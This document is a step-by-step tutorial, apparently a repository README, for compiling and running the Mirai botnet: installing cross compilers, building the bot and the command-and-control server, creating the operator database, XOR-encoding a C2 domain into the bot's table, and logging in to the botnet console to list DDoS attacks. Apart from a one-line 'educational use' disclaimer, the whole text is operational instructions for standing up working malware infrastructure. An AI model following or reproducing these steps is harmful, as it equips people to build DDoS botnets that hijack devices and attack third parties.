# Mirai setup

## What you need:
- Working pihole setup
- Ubuntu / Debian based linux distribution (tested on elementary os)
- Copy of mirai source code

## What we will do
The goal is to setup and run mirai in an local environment.  
But a disclaimer at the beginning: Do not use this to actually attack somebody its only for educational use.
<br><br>

## Setup tools
### First we need to install some packages  

```
sudo apt install gcc golang electric-fence mysql-server mysql-client screen -y
```
<br>

### The next step is to install the cross compilers
```
sudo bash ./tools/compilers.sh
```
<br>

To finish the installation put following at the end of /etc/bash.bashrc or ~/.bashrc
```
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
```
<br>

Now we need to edit /etc/bash.bashrc or ~/.bashrc again. Put the following at the end
```
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go
```
<br>

**Now please restart your bash for those changes to take effect**
<br>

### Now we install the go library's with
```
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords
```
<br>

### Now we can compile it for the first time :D
```
mkdir debug
bash ./build.sh debug telnet
```
<br>

### Now we need to setup the database.
First of all run and make sure to allow root login and don't forget the password we will need it later:
```
sudo mysql_secure_installation
```
<br>

Now run:
```
sudo mysql

Then type:

ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'insert_password';
exit;
```
<br>

Now test it with:
```
sudo mysql -p

If you see this your installation was successfully:

Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 5.7.33-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

Now type 'exit;' again to exit mysql!
```
<br>

Now it's time to create the database run:
```
cat ./tools/db.sql | sudo mysql -p
```
<br>

The last step of creating the database is to add an cnc user account:
```
sudo mysql -p

Then type:
USE mirai;
INSERT INTO users VALUES (NULL, 'insert-mirai-user', 'insert-mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
exit;
```
<br>

Now restart mysql:
```
sudo systemctl restart mysql
```
<br>

### Now we need to change some settings we will begin with the domain.  
You can use whatever domain you like we will register it later using piole.
```
./debug/enc string <your domain>

Exampel output:

root@janick:~/mirai# ./debug/enc string cnc.glowman554.de
XOR'ing 18 bytes of data...
\x41\x4C\x41\x0C\x45\x4E\x4D\x55\x4F\x43\x4C\x17\x17\x16\x0C\x46\x47\x22
```
We need the 18 and '\x41\x4C\x41\x0C\x45\x4E\x4D\x55\x4F\x43\x4C\x17\x17\x16\x0C\x46\x47\x22'
<br>

Now open bot/table.c in your favorite code editor and find the line 
```
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30);

In my case i need to change it to:

add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x45\x4E\x4D\x55\x4F\x43\x4C\x17\x17\x16\x0C\x46\x47\x22", 18);
```
<br>

Now open bot/resolv.c favorite code editor and find the line and change the ip to the ip of your pihole installation
```
addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);

In my case i need to change it to:

addr.sin_addr.s_addr = INET_ADDR(192, 168, 178, 114);
```
<br>

As the last step before compiling it we need to open cnc/main.go and edit following
```
const DatabaseUser string   = "root"
const DatabasePass string   = "password"

In my case i need to change it to:

const DatabaseUser string   = "root"
const DatabasePass string   = "lol_you_want_to_know_this"
```
<br>

### Now we can compile it for the second time :D and copy the prompt.txt file
```
bash ./build.sh debug telnet
cp prompt.txt ./debug/.
```
<br>

### Now its time to setup pihole
To do this you need to login into pihole and go to Local DNS/DNS Records and type in the domain you used earlier in this tutorial and the ip of the server where the cnc is supposed to run on. **Don't forget to click on add!**
<br>

### And finlay we can run it!
To run the cnc use:
```
cd debug
screen -S mirai-cnc sudo ./cnc
```
<br>

To run a bot use:
```
cd debug
screen -S mirai-bot sudo ./mirai.dbd
```
<br>

To connect to the cnc using telnet use:
```
telnet localhost

You will be asked to login you can do that with the user we inserted earlier into the database it should look something like:

я люблю куриные наггетсы
пользователь: janick
пароль: *********

проверив счета... |
[+] DDOS | Succesfully hijacked connection
[+] DDOS | Masking connection from utmp+wtmp...
[+] DDOS | Hiding from netstat...
[+] DDOS | Removing all traces of LD_PRELOAD...
[+] DDOS | Wiping env libc.poison.so.1
[+] DDOS | Wiping env libc.poison.so.2
[+] DDOS | Wiping env libc.poison.so.3
[+] DDOS | Wiping env libc.poison.so.4
[+] DDOS | Setting up virtual terminal...
[!] Sharing access IS prohibited!
[!] Do NOT share your credentials!
Ready
janick@botnet#
```
<br>

Finaly to see a list of attacks type:
```
janick@botnet# ?
```
